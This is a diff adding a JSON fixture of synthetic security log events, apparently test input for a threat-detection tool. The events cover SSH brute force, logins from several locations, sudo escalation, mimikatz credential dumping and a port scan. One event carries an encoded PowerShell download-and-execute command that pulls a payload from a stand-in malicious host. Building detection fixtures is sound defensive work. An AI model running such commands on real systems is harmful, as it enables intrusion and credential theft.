@@ -1,0 +1,38 @@
+[
+  {"timestamp": "2024-01-15T08:01:05Z", "source_ip": "203.0.113.45", "username": "admin", "event_type": "authentication_failure", "message": "Failed password for admin from 203.0.113.45 port 54231 ssh2", "hostname": "prod-server-01", "event_id": "4625"},
+  {"timestamp": "2024-01-15T08:01:07Z", "source_ip": "203.0.113.45", "username": "admin", "event_type": "authentication_failure", "message": "Failed password for admin from 203.0.113.45 port 54232 ssh2", "hostname": "prod-server-01", "event_id": "4625"},
+  {"timestamp": "2024-01-15T08:01:09Z", "source_ip": "203.0.113.45", "username": "root",  "event_type": "authentication_failure", "message": "Failed password for root from 203.0.113.45 port 54233 ssh2",  "hostname": "prod-server-01", "event_id": "4625"},
+  {"timestamp": "2024-01-15T08:01:11Z", "source_ip": "203.0.113.45", "username": "admin", "event_type": "authentication_failure", "message": "Failed password for admin from 203.0.113.45 port 54234 ssh2", "hostname": "prod-server-01", "event_id": "4625"},
+  {"timestamp": "2024-01-15T08:01:13Z", "source_ip": "203.0.113.45", "username": "sysadmin", "event_type": "authentication_failure", "message": "Failed password for sysadmin from 203.0.113.45 port 54235 ssh2", "hostname": "prod-server-01", "event_id": "4625"},
+  {"timestamp": "2024-01-15T08:01:15Z", "source_ip": "203.0.113.45", "username": "admin", "event_type": "authentication_failure", "message": "Failed password for admin from 203.0.113.45 port 54236 ssh2", "hostname": "prod-server-01", "event_id": "4625"},
+  {"timestamp": "2024-01-15T08:01:17Z", "source_ip": "203.0.113.45", "username": "administrator", "event_type": "authentication_failure", "message": "Failed password for administrator from 203.0.113.45 port 54237 ssh2", "hostname": "prod-server-01", "event_id": "4625"},
+  {"timestamp": "2024-01-15T08:01:19Z", "source_ip": "203.0.113.45", "username": "admin", "event_type": "authentication_failure", "message": "Failed password for admin from 203.0.113.45 port 54238 ssh2", "hostname": "prod-server-01", "event_id": "4625"},
+  {"timestamp": "2024-01-15T08:01:21Z", "source_ip": "203.0.113.45", "username": "admin", "event_type": "authentication_failure", "message": "Failed password for admin from 203.0.113.45 port 54239 ssh2", "hostname": "prod-server-01", "event_id": "4625"},
+  {"timestamp": "2024-01-15T08:01:23Z", "source_ip": "203.0.113.45", "username": "admin", "event_type": "authentication_failure", "message": "Failed password for admin from 203.0.113.45 port 54240 ssh2", "hostname": "prod-server-01", "event_id": "4625"},
+
+  {"timestamp": "2024-01-15T08:05:00Z", "source_ip": "10.0.0.50",    "username": "jsmith", "event_type": "authentication_success", "message": "Accepted password for jsmith from 10.0.0.50 port 51000 ssh2", "hostname": "prod-server-01", "event_id": "4624"},
+  {"timestamp": "2024-01-15T08:06:00Z", "source_ip": "172.20.0.100", "username": "jsmith", "event_type": "authentication_success", "message": "Accepted password for jsmith from 172.20.0.100 port 52000 ssh2", "hostname": "prod-server-02", "event_id": "4624"},
+  {"timestamp": "2024-01-15T08:07:00Z", "source_ip": "192.168.50.1", "username": "jsmith", "event_type": "authentication_success", "message": "Accepted password for jsmith from 192.168.50.1 port 53000 ssh2", "hostname": "prod-server-03", "event_id": "4624"},
+  {"timestamp": "2024-01-15T08:08:00Z", "source_ip": "198.51.100.22","username": "jsmith", "event_type": "authentication_success", "message": "Accepted password for jsmith from 198.51.100.22 port 54000 ssh2", "hostname": "prod-server-04", "event_id": "4624"},
+
+  {"timestamp": "2024-01-15T08:10:00Z", "source_ip": "10.0.0.50", "username": "jsmith", "event_type": "privilege_escalation", "message": "sudo: jsmith : TTY=pts/1 ; PWD=/home/jsmith ; USER=root ; COMMAND=/bin/bash", "hostname": "prod-server-01", "event_id": "4672"},
+  {"timestamp": "2024-01-15T08:10:05Z", "source_ip": "10.0.0.50", "username": "jsmith", "event_type": "privilege_escalation", "message": "sudo: jsmith : command /usr/bin/net localgroup administrators jsmith /add", "hostname": "prod-server-01", "event_id": "4728"},
+
+  {"timestamp": "2024-01-15T08:12:00Z", "source_ip": "10.0.0.50", "username": "jsmith", "event_type": "process_creation", "message": "powershell -ExecutionPolicy Bypass -EncodedCommand SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAG0AYQBsAGkAYwBpAG8AdQBzAC4AZQB4AGEAbQBwAGwAZQAvAHAAYQB5AGwAbwBhAGQAJwApAA==", "hostname": "prod-server-01", "event_id": "4688"},
+
+  {"timestamp": "2024-01-15T08:15:00Z", "source_ip": "10.0.0.50", "username": "jsmith", "event_type": "process_creation", "message": "mimikatz.exe sekurlsa::logonpasswords full - credential dumping detected by EDR", "hostname": "prod-server-01", "event_id": "4688"},
+
+  {"timestamp": "2024-01-15T08:20:00Z", "source_ip": "198.51.100.22", "destination_port": "21",   "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"},
+  {"timestamp": "2024-01-15T08:20:01Z", "source_ip": "198.51.100.22", "destination_port": "22",   "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"},
+  {"timestamp": "2024-01-15T08:20:02Z", "source_ip": "198.51.100.22", "destination_port": "23",   "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"},
+  {"timestamp": "2024-01-15T08:20:03Z", "source_ip": "198.51.100.22", "destination_port": "25",   "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"},
+  {"timestamp": "2024-01-15T08:20:04Z", "source_ip": "198.51.100.22", "destination_port": "80",   "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"},
+  {"timestamp": "2024-01-15T08:20:05Z", "source_ip": "198.51.100.22", "destination_port": "443",  "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"},
+  {"timestamp": "2024-01-15T08:20:06Z", "source_ip": "198.51.100.22", "destination_port": "445",  "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"},
+  {"timestamp": "2024-01-15T08:20:07Z", "source_ip": "198.51.100.22", "destination_port": "1433", "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"},
+  {"timestamp": "2024-01-15T08:20:08Z", "source_ip": "198.51.100.22", "destination_port": "3306", "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"},
+  {"timestamp": "2024-01-15T08:20:09Z", "source_ip": "198.51.100.22", "destination_port": "3389", "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"},
+  {"timestamp": "2024-01-15T08:20:10Z", "source_ip": "198.51.100.22", "destination_port": "5985", "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"},
+  {"timestamp": "2024-01-15T08:20:11Z", "source_ip": "198.51.100.22", "destination_port": "8080", "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"},
+  {"timestamp": "2024-01-15T08:20:12Z", "source_ip": "198.51.100.22", "destination_port": "8443", "event_type": "network_connection", "message": "TCP connection attempt", "hostname": "scanner"}
+]
